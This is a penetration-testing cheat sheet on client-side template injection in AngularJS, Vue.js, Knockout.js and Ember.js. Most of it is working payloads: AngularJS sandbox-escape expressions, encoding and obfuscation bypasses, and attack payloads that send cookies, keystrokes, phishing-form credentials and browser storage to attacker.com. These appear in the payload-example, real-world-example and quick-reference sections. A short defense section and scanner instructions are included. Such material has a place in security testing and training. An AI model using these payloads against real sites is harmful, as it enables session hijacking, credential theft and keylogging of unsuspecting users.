# CSTI

### Overview

**CSTI (Client-Side Template Injection)** is a vulnerability that occurs when user input is embedded into client-side templates (JavaScript frameworks) without proper sanitization. Unlike SSTI which executes on the server, CSTI executes in the victim's browser, leading to XSS-like attacks with additional framework-specific capabilities.

**What is client-side templating?** JavaScript frameworks that render dynamic content in the browser:

* **AngularJS** (most commonly vulnerable)
* **Vue.js**
* **React** (less vulnerable due to design)
* **Ember.js**
* **Knockout.js**

**Why it's dangerous:**

* Bypasses traditional XSS filters
* Framework-level code execution
* Access to application context
* Can leak sensitive data
* Often overlooked in security testing

**Common vulnerable scenarios:**

* User profiles with dynamic content
* Search result pages
* Comment systems
* Error messages
* URL parameter reflection

**Impact:**

* Cross-site scripting (XSS)
* Session hijacking
* Credential theft
* Account takeover
* Phishing attacks
* Keylogging

***

### Exploitation Workflow Summary

```
1. Discovery & Detection
   ├─ Identify JavaScript framework
   ├─ Locate reflection points
   ├─ Test template syntax
   └─ Confirm expression evaluation

2. Framework Fingerprinting
   ├─ Identify framework type
   ├─ Determine framework version
   ├─ Check sandbox restrictions
   └─ Map available objects

3. Basic Exploitation
   ├─ Mathematical expressions
   ├─ String operations
   ├─ Object access
   └─ Function calls

4. Sandbox Escape
   ├─ Identify sandbox version
   ├─ Find escape vectors
   ├─ Bypass character filters
   └─ Achieve arbitrary code execution

5. Advanced Exploitation
   ├─ Cookie theft
   ├─ Keylogging
   ├─ DOM manipulation
   └─ Data exfiltration
```

***

### Understanding CSTI

#### How It Works

**Vulnerable pattern:**

```javascript
// Server sends user input to page
var userInput = "<%= user.name %>";

// AngularJS template in HTML
<div ng-app>
  <p>Welcome {{userInput}}!</p>
</div>
```

**Normal behavior:**

```
Input: John
Output: Welcome John!
```

**Malicious behavior:**

```
Input: {{7*7}}
Output: Welcome 49!
```

**The vulnerability:**

* User input treated as template code
* Framework evaluates expressions
* Executes in victim's browser context

***

### AngularJS Exploitation

#### Detection

**Basic detection payload:**

```
{{1+1}}
```

**Expected responses:**

| Response  | Meaning                          |
| --------- | -------------------------------- |
| `2`       | AngularJS present and vulnerable |
| `{{1+1}}` | Not vulnerable or no AngularJS   |

**Alternative detection:**

```
{{7*7}}
{{constructor}}
{{$eval}}
```

#### Version Identification

**Check Angular version:**

```html
<!-- Look in page source -->
<script src="angular.min.js"></script>
<script src="angular-1.4.0.min.js"></script>
```

**Test version-specific features:**

```
{{$root}}       // Works in most versions
{{$parent}}     // Works in most versions
{{constructor}} // Behavior varies by version
```

**Version matters because:**

* Different sandbox restrictions
* Different escape techniques required
* Older versions easier to exploit

#### Basic Expression Evaluation

**Mathematical operations:**

```
{{1+1}}
{{7*7}}
{{10/2}}
```

**String operations:**

```
{{'test'}}
{{'a'+'b'}}
{{'test'.charAt(0)}}
```

**Array operations:**

```
{{[1,2,3]}}
{{[1,2,3].length}}
{{[1,2,3][0]}}
```

***

### AngularJS Sandbox Escape

#### Understanding the Sandbox

**AngularJS versions:**

* **< 1.2.0** - No sandbox
* **1.2.0 - 1.5.9** - Sandbox with known bypasses
* **1.6.0+** - Improved sandbox (still bypassable)

#### Pre-1.2.0 (No Sandbox)

**Direct code execution:**

```javascript
{{constructor.constructor('alert(1)')()}}
```

**How it works:**

1. `constructor` - Access Function constructor
2. `.constructor` - Get constructor of constructor
3. `('alert(1)')` - Create new function
4. `()` - Execute function

**Alternative:**

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

#### 1.2.0 - 1.5.9 Sandbox Bypasses

**Bypass 1: Using valueOf:**

```javascript
{{x=http://valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

**Explanation:**

1. `valueOf` - Access valueOf method
2. `.name` - Get name property
3. `.constructor` - String constructor
4. `.fromCharCode` - Build string from char codes
5. `x(97,108,101,114,116,40,49,41)` - Builds "alert(1)"
6. `constructor.constructor(...)()` - Execute code

**Character codes:**

```
97  = 'a'
108 = 'l'
101 = 'e'
114 = 'r'
116 = 't'
40  = '('
49  = '1'
41  = ')'
```

**Bypass 2: Using charAt:**

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**How it works:**

1. Override `charAt` with `valueOf`
2. Use `$eval` to evaluate expression
3. Unicode escape `\u002e` for `.`
4. Execute arbitrary JavaScript

**Bypass 3: Function constructor access:**

```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
```

**Bypass 4: Via window object:**

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
```

#### 1.6.0+ Bypasses

**Bypass using orderBy:**

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)');}}
```

**Character building technique:**

```javascript
{{constructor.constructor('alert(String.fromCharCode(88,83,83))')()}}
```

**String.fromCharCode values:**

```
88 = 'X'
83 = 'S'
83 = 'S'
Result: "XSS"
```

***

### Complete Payload Examples

#### Cookie Theft

**Basic cookie exfiltration:**

```javascript
{{constructor.constructor('window.location="http://attacker.com/?c="+document.cookie')()}}
```

**With image tag:**

```javascript
{{constructor.constructor('var i=new Image();i.src="http://attacker.com/?c="+document.cookie')()}}
```

#### Keylogger

**Simple keylogger:**

```javascript
{{constructor.constructor('document.onkeypress=function(e){fetch("http://attacker.com/log?key="+e.key)}')()}}
```

**Full keylogger:**

```javascript
{{constructor.constructor('var keys="";document.onkeypress=function(e){keys+=e.key;if(keys.length>20){fetch("http://attacker.com/?k="+btoa(keys));keys=""}}')()}}
```

#### DOM Manipulation

**Phishing overlay:**

```javascript
{{constructor.constructor('document.body.innerHTML="<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><h1>Session Expired</h1><form action=\"http://attacker.com/phish\"><input name=\"user\" placeholder=\"Username\"/><input name=\"pass\" type=\"password\" placeholder=\"Password\"/><button>Login</button></form></div>"')()}}
```

#### Reverse Connection

**Fetch to attacker server:**

```javascript
{{constructor.constructor('fetch("http://attacker.com/collect",{method:"POST",body:JSON.stringify({cookies:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage})})')()}}
```

***

### Vue.js Exploitation

#### Detection

**Basic test:**

```
{{1+1}}
```

**Vue-specific:**

```
{{$el}}
{{constructor}}
```

#### Expression Evaluation

**Vue.js allows JavaScript:**

```html
<div id="app">
  {{7*7}}
  {{constructor.constructor('alert(1)')()}}
</div>
```

#### XSS Payloads

**Basic XSS:**

```
{{constructor.constructor('alert(document.domain)')()}}
```

**Event handlers:**

```html
<div v-html="'<img src=x onerror=alert(1)>'"></div>
```

***

### Other Frameworks

#### Knockout.js

**Detection:**

```
<span data-bind="text: 1+1"></span>
```

**Exploitation:**

```
<span data-bind="text: constructor.constructor('alert(1)')()"></span>
```

#### Ember.js

**Detection:**

```
{{1+1}}
```

**Exploitation:**

```
{{constructor.constructor('alert(1)')()}}
```

***

### Testing Methodology

#### Step 1: Identify Framework

**Check page source for:**

```html
<!-- AngularJS -->
<script src="angular.js"></script>
<div ng-app></div>
{{}}

<!-- Vue.js -->
<script src="vue.js"></script>
<div id="app"></div>
{{}}

<!-- React (less vulnerable) -->
<script src="react.js"></script>
<div id="root"></div>
```

**Check console:**

```javascript
// In browser console
angular.version    // AngularJS
window.Vue         // Vue.js
window.React       // React
```

#### Step 2: Find Injection Points

**Test reflection in:**

* URL parameters
* POST data
* Error messages
* User profiles
* Search boxes
* Comments

#### Step 3: Test Template Syntax

**Inject test payloads:**

```
{{1+1}}
{{7*7}}
{{constructor}}
```

**Observe responses:**

* Evaluated (2, 49) = Vulnerable
* Raw (\{{1+1\}}) = Not vulnerable
* Error = Possible WAF/filter

#### Step 4: Identify Version

**Test version-specific features:**

```
{{$root}}           // All versions
{{$parent}}         // All versions  
{{constructor}}     // Varies by version
```

#### Step 5: Craft Exploit

**Based on version, use appropriate bypass**

***

### Real-World Examples

#### Example 1: Search Functionality

**Vulnerable code:**

```html
<div ng-app>
  <h1>Search Results for: {{query}}</h1>
</div>
```

**Attack:**

```
GET /search?query={{constructor.constructor('alert(document.cookie)')()}}
```

**Result:** Cookie theft when victim visits link

#### Example 2: User Profile

**Vulnerable code:**

```html
<div ng-app>
  <p>Bio: {{user.bio}}</p>
</div>
```

**Attack:**

```
Update bio to:
{{constructor.constructor('fetch("http://attacker.com/?c="+document.cookie)')()}}
```

**Result:** Anyone viewing profile gets their cookies stolen

#### Example 3: Error Message

**Vulnerable code:**

```html
<div ng-app>
  <div class="error">{{errorMessage}}</div>
</div>
```

**Attack:**

```
Trigger error with:
{{constructor.constructor('document.location="http://attacker.com/?c="+document.cookie')()}}
```

***

### Bypass Techniques

#### Character Encoding

**Unicode escape:**

```javascript
{{constructor.constructor('alert\u0028\u0031\u0029')()}}
```

**Hex escape:**

```javascript
{{constructor.constructor('alert\x28\x31\x29')()}}
```

#### String Concatenation

**Building strings:**

```javascript
{{constructor.constructor('ale'+'rt(1)')()}}
{{constructor.constructor(['ale','rt(1)'].join(''))()}}
```

#### String.fromCharCode

**Building alert:**

```javascript
{{constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}
```

**Common character codes:**

```
97  = a
108 = l
101 = e
114 = r
116 = t
40  = (
49  = 1
41  = )
```

#### Obfuscation

**Using toString:**

```javascript
{{constructor.constructor(1..toString(36).toLowerCase()+31..toString(36).toLowerCase()+'ert(1)')()}}
```

**Result:** `alert(1)`

***

### Defense & Prevention

**Content Security Policy:**

```html
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Input sanitization:**

```javascript
// Bad
$scope.userInput = request.params.input;

// Good
$scope.userInput = DOMPurify.sanitize(request.params.input);
```

**Disable expression evaluation:**

```javascript
// AngularJS - use ng-bind instead of {{}}
<div ng-bind="userInput"></div>

// Vue.js - use v-text instead of {{}}
<div v-text="userInput"></div>
```

**Framework configuration:**

```javascript
// AngularJS - strict contextual escaping
angular.module('app').config(function($sceProvider) {
  $sceProvider.enabled(true);
});
```

**Validation:**

* Whitelist allowed characters
* Reject template syntax (\{{ \}})
* Escape output properly
* Use framework security features

***

### Automated Tools

#### AngularJS CSTI Scanner

```bash
# Install
git clone https://github.com/tijme/angularjs-csti-scanner
cd angularjs-csti-scanner
pip install -r requirements.txt

# Scan
python acstis.py -u "http://target.com/search?q=test"

# Scan with custom payload
python acstis.py -u "http://target.com/search?q=test" -p "{{7*7}}"
```

#### Manual Testing

**Burp Suite Intruder:**

**Position:**

```
GET /search?q=§payload§
```

**Payloads:**

```
{{1+1}}
{{7*7}}
{{constructor}}
{{constructor.constructor('alert(1)')()}}
```

***

### Quick Reference

#### Detection Payloads

```
{{1+1}}
{{7*7}}
{{constructor}}
{{$eval('1+1')}}
```

#### Basic XSS

```javascript
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(document.domain)')()}}
{{constructor.constructor('alert(document.cookie)')()}}
```

#### Sandbox Bypasses

```javascript
// Pre-1.2
{{constructor.constructor('alert(1)')()}}

// 1.2-1.5
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='alert(1)')+eval(y)+\"'");}}

// 1.6+
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;constructor.constructor('alert(1)')()}}
```

#### Cookie Theft

```javascript
{{constructor.constructor('fetch("http://attacker.com/?c="+document.cookie)')()}}
```

